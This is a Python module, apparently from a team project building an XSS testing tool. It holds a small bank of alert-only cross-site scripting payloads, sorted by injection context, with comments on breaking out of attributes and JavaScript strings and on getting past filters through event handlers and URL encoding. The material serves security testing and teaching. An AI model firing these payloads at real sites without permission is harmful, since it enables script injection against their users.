"""
payload_bank.py
Owner: Member 1 (Payload Bank Lead)

Holds the base XSS payloads, organized by injection context.

Contexts so far:
- html_body   : payload lands directly inside the page's HTML body
- attribute   : payload lands inside an HTML tag attribute, e.g. <input value="HERE">
- js_string   : payload lands inside a JavaScript string literal, e.g. var x = "HERE";
- url_param   : payload lands in a URL query parameter that gets reflected into the page

TODO (Member 1):
- Add more payloads per context (right now 1-2 each, just enough
  to prove the pipeline works for every context)
- Add a "css" context later if time allows
- Keep payloads realistic but SAFE examples (no real victim data,
  no payloads that phone out to an external server)
"""

PAYLOADS = {
    "html_body": [
        "<script>alert('XSS-test')</script>",
    ],

    "attribute": [
        # Breaks out of a double-quoted attribute value, e.g.
        # <input type="text" value="HERE">
        # becomes:
        # <input type="text" value=""><script>alert('XSS-test')</script>
        "\"><script>alert('XSS-test')</script>",

        # Doesn't even need to break out of the tag - just adds a new
        # event handler attribute, works if the filter only blocks <script>
        "\" onmouseover=\"alert('XSS-test')",
    ],

    "js_string": [
        # Breaks out of a JS string literal, e.g.
        # var x = "HERE";
        # becomes:
        # var x = "";alert('XSS-test');//";
        "\";alert('XSS-test');//",

        # Same idea but for single-quoted JS strings
        "';alert('XSS-test');//",
    ],

    "url_param": [
        # For when a URL param gets reflected straight into HTML,
        # e.g. https://example.com/search?q=HERE
        "<script>alert('XSS-test')</script>",

        # URL-encoded version - useful when the app decodes the param
        # before reflecting it, so a plain <script> might get blocked
        # but this slips through URL-encoding filters
        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",
    ],
}


def get_payloads(context: str):
    """
    Return the list of base payloads for a given injection context.
    Raises a clear error if the context doesn't exist yet, instead
    of silently returning nothing (helps whoever's debugging cli.py).
    """
    if context not in PAYLOADS:
        raise ValueError(
            f"Unknown context '{context}'. "
            f"Available contexts so far: {list(PAYLOADS.keys())}"
        )
    return PAYLOADS[context]


def list_contexts():
    """
    Return all currently available contexts. Useful for cli.py
    when building a --context flag with argparse choices=...
    """
    return list(PAYLOADS.keys())
